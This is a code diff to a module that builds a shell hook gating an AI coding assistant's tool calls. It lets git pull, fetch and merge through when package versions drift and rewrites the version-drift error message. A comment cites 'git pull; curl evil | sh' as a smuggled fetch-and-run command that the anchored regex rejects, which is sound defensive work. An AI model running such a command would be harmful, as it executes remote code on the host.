@@ -70,6 +70,31 @@ export const RECOVERY_ALLOW_JS =
 // The exact command we tell the human/assistant to run to recover a corrupt node_modules.
 export const RECOVERY_CMD = 'rm -rf node_modules && pnpm install';
 
+// Git SYNC commands, allowed ONLY on the version-DRIFT path (never for a missing/broken bin, which no
+// amount of git can fix). This closes a real deadlock, hit 2026-07-17:
+//
+// The drift guard was written for ONE direction — you `git pull`, the new package.json pins a NEWER
+// @webpieces, node_modules is still OLD, and `pnpm install` catches it up. But the comparison is a
+// plain `!=`, so it fires just as hard in the INVERSE case: check out a branch (or a local `main`)
+// that is BEHIND origin, and now the PIN is the stale side while node_modules is correct and NEWER.
+//
+// In that inverse case `pnpm install` is not the cure, it is the disease: it happily DOWNGRADES
+// node_modules to the stale pin. The real cure is `git pull` — which the guard denied, because the
+// allowlist only ever contained the installer. So the assistant was told to run the one command that
+// made things worse, while the fix was blocked. Allow the sync commands here and the deadlock is gone.
+//
+// Kept exactly as tight as INSTALLER_ALLOW_ERE: anchored at both ends, and every argument token is a
+// bare word or `--flag` — so no shell operator (`;`, `&&`, `|`, backticks, `$()`, `>`) can ride along.
+// `git pull; curl evil | sh` still FAILS CLOSED. Deliberately NOT `git checkout`: switching branches is
+// what CAUSES this drift, and a fail-closed escape hatch should only contain cures.
+// Keep in sync with SYNC_ALLOW_JS below (locked by a unit test).
+export const SYNC_ALLOW_ERE =
+    '^git[[:space:]]+(pull|fetch|merge)([[:space:]]+(--)?[A-Za-z0-9][A-Za-z0-9=._/@:-]*)*[[:space:]]*$';
+
+// JS-regex twin of SYNC_ALLOW_ERE (POSIX `[[:space:]]` → `\s`). A unit test asserts the two agree.
+export const SYNC_ALLOW_JS =
+    /^git\s+(pull|fetch|merge)(\s+(--)?[A-Za-z0-9][A-Za-z0-9=._/@:-]*)*\s*$/;
+
 // Normal template literal (not String.raw): it carries #235's shell escapes verbatim (\${BIN_NAME},
 // \$REASON, \\n for the deny JSON) AND my sed backslashes (doubled: \\(, \\), \\1, [^"\\\\]). The
 // grep pattern is interpolated from INSTALLER_ALLOW_ERE (its value has no backslashes).
@@ -162,6 +187,13 @@ if printf '%s' "\$CMD" | grep -Eq '${INSTALLER_ALLOW_ERE}' || printf '%s' "\$CMD
   wp_log ALLOW-INSTALL       # record the self-heal we let through (re-enables the guards)
   exit 0                     # allow the installer/recovery so the assistant can break the deadlock
 fi
+# DRIFT ONLY: let the git sync commands through. When the PIN is the stale side (a checkout behind
+# origin), 'pnpm install' DOWNGRADES and 'git pull' is the only cure — denying it deadlocks the
+# assistant against its own fix. Pointless for a missing/broken bin, so it stays gated on drift.
+if [ -n "\$DRIFT_PKG" ] && printf '%s' "\$CMD" | grep -Eq '${SYNC_ALLOW_ERE}'; then
+  wp_log ALLOW-SYNC          # record the git sync we let through (may be what re-syncs the pin)
+  exit 0
+fi
 wp_log "\$DENY_LABEL"         # every fail-closed block (…-STALE = drift, …-BROKEN = crash) for inspection`;
 
 // Shell fragment: emit the deny. FAIL CLOSED via Claude Code's PreToolUse JSON protocol
@@ -200,7 +232,11 @@ const DENY_REASON_SH = `if [ -n "\$BROKEN_BIN" ]; then
   fi
   REASON="❌ webpieces guards are DOWN and every tool call is BLOCKED: \${BIN_NAME} is installed but CRASHED (\$CRASH_MSG). Your node_modules is corrupt or partially written, so the guards cannot run - and they must NOT be silently skipped. NOTE: a plain 'pnpm install' will NOT fix this; pnpm sees the correct version on disk and skips the broken package. Run exactly this, then retry: ${RECOVERY_CMD}\${STAGING_NOTE}"
 elif [ -n "\$DRIFT_PKG" ]; then
-  REASON="❌ webpieces is out of date: package.json pins \$DRIFT_PKG@\$DRIFT_DECLARED but node_modules has \$DRIFT_INSTALLED. This hook rejects every call except 'pnpm install' because your installed webpieces is older than webpieces.config.json requires. Please run 'pnpm install' now, then retry."
+  # State the two versions and let the reader judge which is stale — do NOT assert a direction. The
+  # check is a plain !=, so it fires BOTH ways, and the old text always claimed node_modules was the
+  # older side. When it is actually the NEWER side (a checkout behind origin), that text sent people
+  # to 'pnpm install', which DOWNGRADES them further from correct.
+  REASON="❌ webpieces version drift: package.json pins \$DRIFT_PKG@\$DRIFT_DECLARED but node_modules has \$DRIFT_INSTALLED. Every call is blocked until they agree. WHICH ONE IS STALE decides the fix - compare the two versions above: (1) pin is NEWER than node_modules (you just pulled/switched to a branch pinning a newer webpieces) -> run 'pnpm install' to catch node_modules up. (2) pin is OLDER than node_modules (your checkout is behind origin, so the PIN is the stale side) -> 'pnpm install' would DOWNGRADE you: run 'git pull' first (or 'git merge --ff-only origin/main'), THEN 'pnpm install'. git pull/fetch/merge are allowed while this guard is up."
 else
   REASON="❌ @webpieces/ai-hook-rules is declared in package.json but is not installed (\${BIN_NAME} not found). Run 'pnpm install' (or this repo's installer) to enable the webpieces AI guards, then retry. (If you removed @webpieces/ai-hook-rules on purpose, delete its hooks from .claude/settings.json.)"
 fi`;
